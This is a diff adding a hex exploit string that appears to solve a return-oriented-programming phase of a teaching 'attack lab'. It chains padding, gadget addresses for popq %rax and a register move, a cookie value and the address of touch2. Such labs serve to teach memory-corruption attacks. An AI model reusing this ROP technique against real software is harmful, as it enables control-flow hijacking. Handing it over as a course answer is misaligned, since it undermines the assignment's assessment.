@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c0 27 40 00 00 00 00 00 /* address of gadget 1 popq %rax */
+bd ef 39 2a 00 00 00 00 /* hex cookie */
+b4 27 40 00 00 00 00 00 /* address of gadget 2 %rax to %rdi */
+b1 25 40 00 00 00 00 00 /* address of touch2 */
